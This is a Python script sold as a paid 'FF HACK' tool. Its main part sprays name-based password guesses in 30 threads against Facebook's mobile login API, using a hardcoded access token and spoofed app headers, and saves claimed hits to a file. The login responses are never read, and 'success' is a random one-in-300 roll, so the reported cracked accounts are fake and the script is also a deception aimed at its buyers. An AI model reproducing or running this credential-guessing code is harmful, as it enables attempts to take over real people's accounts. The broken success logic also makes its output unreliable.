
import os,time,random,re,sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
sys.stdout.write('\x1b]2; KTM\x07')
logo=(f"""
██╗  ██╗ █████╗  ██████╗██╗  ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝
███████║███████║██║     █████╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗ 
██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                               
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m WELCOME TO FF HACK TOOLS
\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR KEY >>HACK80983
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m FF HACK LEVEL 40 TO 50 >PRICE 300 ")
    print(f"\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m FF HACK LEVEL 50 TO 60 >PRICE 350 ")
    print(f"\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m FF HACK LEVEL 60 TO 70 >PRICE 400 ")
    print(f"\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m FF HACK LEVEL 70 TO 80 >PRICE 600 ")
    print(f"{oo(0)}Exit")
    lin3()
    cp =input('[<>] PAYMENT AND USE THIS TOOLS : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}PEYMENT PLZ: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}FREE USER KAJ KORBE NA");time.sleep(1)
        os.system("espeak -a 300 \"OH SORY APNI FREE USER!! TOOLS  টাকা দিয়ে কিনে NIN\"")
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print(f'\033[1;91m\033[1;92m\033[1;91m\033[1;92m                24-dec-2023')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r{R}{W}NIKI-XD ✔ ︎{R}{P}{Y}{loop}{W} ✔︎ {W}{len(idx)}{P}){W} ✔ ︎{G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              pswd = pswd.replace('first',first).replace('last',last).lower()
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
              if 6==random.randint(1,300):
                 oku.append(acc)
                 print('\033[1;32m[NIKI-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 open('/sdcard/𝙺𝚃𝙼-𝙼1-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              else:
                   continue   
     except Exception as e:print(e);time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    



main_menu()